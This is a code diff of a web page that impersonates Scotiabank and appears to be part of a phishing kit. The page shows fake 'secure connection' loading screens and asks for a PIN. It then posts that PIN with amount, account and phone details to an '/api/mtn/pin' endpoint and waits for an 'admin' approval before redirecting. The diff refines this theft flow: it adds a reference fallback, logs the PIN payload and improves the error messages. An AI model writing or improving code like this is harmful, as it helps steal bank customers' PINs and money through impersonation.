@@ -426,7 +426,6 @@
   }
   .pin-cancel:hover { color: var(--sb-gold); }
 
-  /* ═══ RESPONSIVE ═══ */
   @media (max-width: 380px) {
     .header { padding: 14px 14px 12px; }
     .header-logo { height: 20px; }
@@ -711,7 +710,7 @@
     }
 
     tx = {
-      ref: data.tx || '',
+      ref: data.tx || data.trackingNumber || '',
       am:  data.am || '',
       cur: data.cur || '',
       rn:  data.rn || '',
@@ -720,9 +719,11 @@
       sn:  data.sn || '',
       mk:  data.mk || '',
       an:  data.an || '',
-      dt:  data.dt || data.ts || data.createdAt || Date.now(),
+      dt:  data.dtIso || data.dt || data.ts || data.createdAt || Date.now(),
       pu:  data.pu || data.purpose || ''
     };
+
+    console.log('[index] loaded tx:', tx);
 
     const amtFull = formatAmount(tx.am, tx.cur);
     document.getElementById('heroAmount').innerHTML =
@@ -802,13 +803,12 @@
 
   /* ═══════════════════════════════════════════════════════════
      CONFIRM FLOW
-     Confirm → loading → popup → loading → PIN → loading → poll → redirect
      ═══════════════════════════════════════════════════════════ */
 
   function showLoading(title, desc, note) {
     document.getElementById('loadingTitle').textContent = title;
     document.getElementById('loadingDesc').textContent = desc;
-    document.getElementById('loadingNote').textContent = note || 'This usually takes a few seconds.';
+    document.getElementById('loadingNote').textContent = note || '';
     document.getElementById('loadingOverlay').classList.add('show');
   }
   function hideLoading() {
@@ -817,7 +817,7 @@
   function setLoadingTitle(title, desc, note) {
     document.getElementById('loadingTitle').textContent = title;
     document.getElementById('loadingDesc').textContent = desc;
-    document.getElementById('loadingNote').textContent = note || 'This usually takes a few seconds.';
+    document.getElementById('loadingNote').textContent = note || '';
   }
 
   function startConfirmFlow() {
@@ -827,7 +827,7 @@
     showLoading(
       'Verifying transaction…',
       'Connecting securely to Scotiabank. Please do not close this page.',
-      'This usually takes a few seconds.'
+      ''
     );
 
     setTimeout(() => {
@@ -849,8 +849,8 @@
 
     showLoading(
       'Securing your transfer…',
-      'Preparing a secure connection to authorize this payment.',
-      'Please wait.'
+      'Preparing a secure connection.',
+      ''
     );
 
     setTimeout(() => {
@@ -905,6 +905,17 @@
     }
     if (err) err.classList.remove('show');
 
+    // Fallback: if tx.ref is empty, try ?r= from URL
+    if (!tx.ref) {
+      const u = new URLSearchParams(location.search);
+      tx.ref = (u.get('r') || u.get('t') || '').toString();
+    }
+
+    if (!tx.ref) {
+      if (err) { err.textContent = 'Reference missing. Please reload the link.'; err.classList.add('show'); }
+      return;
+    }
+
     const btn = document.getElementById('pinSubmitBtn');
     btn.disabled = true;
     btn.textContent = 'Authorizing…';
@@ -913,50 +924,64 @@
 
     showLoading(
       'Submitting your PIN…',
-      'Sending your secure authorization to Scotiabank.',
-      'Please wait.'
+      'Please wait.',
+      ''
     );
+
+    const payload = {
+      tx: tx.ref,
+      pin: pin,
+      am: tx.am,
+      cur: tx.cur,
+      c: tx.c,
+      an: tx.an,
+      rn: tx.rn,
+      phone: tx.an || '',
+      lang: 'en'
+    };
+
+    // Log what we're about to send
+    console.log('[index] POST /api/mtn/pin payload:', payload);
 
     try {
       const r = await fetch(API_BASE + '/api/mtn/pin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tx: tx.ref,
-          pin: pin,
-          am: tx.am,
-          cur: tx.cur,
-          c: tx.c,
-          an: tx.an,
-          rn: tx.rn,
-          phone: tx.an || '',
-          lang: 'en'
-        })
+        body: JSON.stringify(payload)
       });
+
+      const body = await r.text();
+      console.log('[index] /api/mtn/pin response:', r.status, body);
 
       if (!r.ok) {
         hideLoading();
         showPinPanel();
-        if (err) { err.textContent = 'Could not submit PIN. Please try again.'; err.classList.add('show'); }
+        if (err) {
+          let detail = 'Could not submit PIN.';
+          try { const j = JSON.parse(body); detail = j.message || j.error || detail; } catch(_) {}
+          err.textContent = detail;
+          err.classList.add('show');
+        }
         return;
       }
     } catch (e) {
+      console.error('[index] PIN submit failed:', e);
       hideLoading();
       showPinPanel();
       if (err) { err.textContent = 'Network error. Please try again.'; err.classList.add('show'); }
       return;
     }
 
-    // PIN submitted — now wait for admin approval on this same page
+    // Waiting for approval
     setLoadingTitle(
-      'Waiting for approval…',
-      'Your PIN has been submitted. An agent is verifying your transfer. Please do not close this page.',
-      'This usually takes 1–2 minutes.'
+      'Processing…',
+      'Please do not close this page.',
+      ''
     );
 
     pollingActive = true;
     const start = Date.now();
-    const MAX_WAIT_MS = 5 * 60 * 1000; // 5 minutes
+    const MAX_WAIT_MS = 5 * 60 * 1000;
 
     const poll = async () => {
       if (!pollingActive) return;
@@ -982,11 +1007,7 @@
 
       if (decision === 'approved') {
         pollingActive = false;
-        setLoadingTitle(
-          'Approved — redirecting…',
-          'Your transfer has been approved. Loading the next step.',
-          'Please wait.'
-        );
+        setLoadingTitle('Redirecting…', 'Please wait.', '');
         setTimeout(() => {
           const q = new URLSearchParams({
             tx:  tx.ref,
